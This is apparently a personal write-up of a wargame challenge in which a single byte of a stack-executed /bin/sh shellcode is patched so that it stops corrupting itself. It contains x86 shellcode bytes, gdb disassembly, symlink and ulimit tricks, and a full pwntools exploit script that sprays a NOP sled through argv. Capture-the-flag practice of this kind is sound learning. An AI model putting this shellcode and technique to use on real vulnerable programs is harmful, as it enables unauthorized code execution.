*Why bother to make your own shellcode?
I can simply copy&paste from shell-storm.org
so I just copied it from shell-storm then used it for my buffer overflow exercise
but it doesn't work :(
can you please help me to fix this??*

* binary problem
	when downloading fix executable windows tell it's a trojan program![[Pasted image 20231115151844.png]]
	I don't know if the shellcode is the problem... it is more over windows found that we smash the stack and it aborted the program... so we would have to test everything on the remote machine...

`checksec` it 
```bash
[*] '/home/fix/fix'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
no protections enabled...

### code
 * `scanf` an index that **must be lower then 22**  
 * `scanf` 4 bytes to `fix` 
 * `sc[index] = fix` changing only one byte.
 * we put the `sc` on the stack with `strcpy`.
 * `*(int*)(buf+32) = buf;` overriding the return address.
 * then returning to main...
 
the shellcode get's executed but when trying to execute `int 0x80` the program crashes.

### `gdb`

```text
b *0x08048552 - ret in shellcode
```
## The problem
the shellcode is fine... and it executes fine but it crashes on `mov al, 0xb` , I read about shellcode pitfalls and come around this `liveoverflow` [video](https://www.youtube.com/watch?v=Xvh8FkczNUc)  . the problem is that the code override itself with `push`es. 
### solution
The solution on the video is to move the shellcode away from the shellcode using `nop` slide at the end of the shellcode.

### Ideas
* 4 byte write
	* jump to the shellcode that is not corrupted.
	* I can use both `pop` and `popal` to get `eax` to a zeroed value  and increase `esp` 
		1. find how to override the `xor eax, eax` without damaging the shellcode.
			* find each instruction length (`objdump` didn't worked).
			* using `gdb`
			```
			0xfff0575c:  xor    eax,eax
			0xfff0575e:  push   eax
			0xfff0575f:  push   0x68732f2f
			0xfff05764:  push   0x6e69622f
			0xfff05769:  mov    ebx,esp
			0xfff0576b:  push   eax
			0xfff0576c:  push   ebx
			0xfff0576d:  mov    ecx,esp
			0xfff0576f:  mov    al,0xb
			0xfff05771:  int    0x80
			```
			so `xor eax, eax` takes two bytes
		2. find the correct opcodes to `pop` and `popal` using `gdb`.
			 `popal` - 0x61
			 `push eax` - 0x50
		0x68619050, 
		the return value it's -2 it failed. This is because the string is not terminated by a null.
* `leave` (0xC9)
	leave will change `esp`. the problem is that it could only be exchange with the `push`es. 
	1. the first push would cause an error because the stack will be without a terminating zero for `/bin/sh`
	2. the second push will make `argv` an array without terminating zero... because it had a second parameter the shell tried to run it. and then it closed. 
	    `(echo -e "15\n201"; cat) | ./fix` didn't helped.
	1. the third push will cause `argv` to point to a random array (it's too late)
* `xchg ebx, esp` 
	if I will have a valid value in `ebx` then it will run... `ebx` was zero
* `ret`
	let's return to the shellcode again, feels to complicated
* push the instruction I want in the `0xf` push
	need to be checked


[This online assembler](https://defuse.ca/online-x86-assembler.htm#disassembly) was helpful. 

### Direction
* I can change one byte
* the problem is that `esp` is too close to the `buf`
	* I change `esp`
	* I jump to another location in memory ***5 bytes***
* it feels weird to move `esp`  to a location with zero 
* one byte instructions that change `esp`: `leave, push, pop, pusha popa`
* multi byte instructions `enter`, `mov esp, ebp, xchg`
* we must change an instruction before the second push

## understanding the shellcode
### [calling convention](https://docs.freebsd.org/en/books/developers-handbook/x86/#x86-system-calls)
#### parameters
on the stack
or `ebx, ecx, edx, esi, edi, ebp`
### return value
most of the times in `eax`
[building a shellcode](https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html)

```
0:  31 c0                   xor    eax,eax  
2:  50                      push   eax  
3:  68 2f 2f 73 68          push   0x68732f2f  
8:  68 2f 62 69 6e          push   0x6e69622f "/bin//sh" 
d:  89 e3                   mov    ebx,esp  path
f:  50                      push   eax      argv[1]
10: 53                      push   ebx      argv[0]
11: 89 e1                   mov    ecx,esp  argv
13: b0 0b                   mov    al,0xb  
15: cd 80                   int    0x80
```

### lazier focus direction
```
0:  31 c0                   xor    eax,eax  
2:  50                      push   eax  
3:  68 2f 2f 73 68          push   0x68732f2f  
8:  68 2f 62 69 6e          push   0x6e69622f "/bin//sh" 
d:  89 e3                   mov    ebx,esp  path
f:  50                      push   eax      argv[1]
```
change one byte of the above code to make `esp` bigger by at least 8 bytes, and keep the purpose of the program.

1. most probably don't change the `/bin//sh` pushes. moreover we must save it to `ebx` `esp`
2. it leaves you with
```
0:  31 c0                   xor    eax,eax  
2:  50                      push   eax  
... 
d:  89 e3                   mov    ebx,esp  path a must
f:  50                      push   eax      argv[1]
```


### simplification
let's simplify the problem... I could use the string passed in `argv`  and link it to cat flag :)

I could use `strace` to see to see the binary value 
```
ln -s /tmp/r12m/r.sh `echo -en "\x83\xc4\x10\x83\xec\x0cP\xe8\x8dc\x01"`
export PATH="/tmp/r12m:$PATH"
ln -s /home/fix/fix fixed
and run fixed in the /tmp/r12m directory
```

## writeups
* intended solution
	1. change 15th index of shellcode into 0xc9 (201)
	2. create `symlink` for a shell script input file:
	ln -s /tmp/fix8/a.sh `perl -e 'print"\x83\xc4\x10\x83\xec\x0c\x50\xe8\x4d\x61\x01"'`
	3. put whatever commands in a.sh. these commands will be executed as `fix_pwn`
* simply extend the stack 
	ulimit -s unlimited  (setting the stack size to be unlimited OMFG)
	offset 15 change to `pop esp` (92), using the pop we are saying that the stack is at `0x6e69622f` which is zeroed. 
* `nop` sled (jump to `argv`) 
	1. Put a big NOP sled and then exec /bin/sh shellcode in argv. spam argv to be very long.
	2. change 16th byte to 0x0f (15)
	
	the challenge shellcode now looks like this:
	
	```
	0:  31 c0                   xor    eax,eax
	2:  50                      push   eax
	3:  68 2f 2f 73 68          push   0x68732f2f
	8:  68 2f 62 69 6e          push   0x6e69622f
	d:  89 e3                   mov    ebx,esp
	f:  50                      push   eax
	10: 0f 89 e1 b0 0b cd       jns    0xcd0bb0f7
	16: 80                      .byte 0x80
	```
	
	so, `jns 0xcd0bb0f7` is a 32bit RELATIVE jump that jumps to `eip` + 0xcd0bb0f7.
	
	This is not a good address :( it will be some random unmapped address.
	
	But don't lose hope! when we get to the "`push   eax`", since `esp` is near the address of the opcode, it changes the opcode of the `jns` to
	
	0`f 89 e1 b0 00 00       jns    0xb0f7`
	
	so now it will jump to `eip` + 0xb0f7, which an address further up the stack! It will jump to our `argv` since we sprayed it all over the stack, and will run shellcode from some random address of `argv`.
	This is why we wrote a big NOP sled, so there'll be a higher probability of landing somewhere in the NOP sled and not in the middle of the shellcode :).
	
	
	---------------------- exploit code ----------------------------
	
	```python
	#!/usr/bin/env python3
	
	from pwn import *
	
	exe = ELF("./fix")
	
	context.binary = exe
	
	def conn():
	    if args.L or args.D:
	        r = process([exe.path] + argv)
	        if args.D:
	            gdb.attach(r, gdbscript=gdbscript)
	            time.sleep(3)
	    elif args.S:
	        r = gdb.debug(args=[exe.path] + argv, gdbscript=gdbscript)
	    else:
	        r = remote("pwnable.kr", 9001)
	
	    return r
	
	gdbscript = '''
	tbreak main
	b *shellcode+55
	continue
	'''.format(**locals())
	argv = [('\x90' * 500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" + "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80") * 100]
	
	
	def main():
	    r = conn() # input 16 and then 15 (0x0f at index 16). this makes a jump to argv.
	    r.sendline('16')
	    r.sendline('15')
	
	    r.interactive()
	```
	wow! You could use both a big jump to `argv` and both the push `eax`. This is incredible !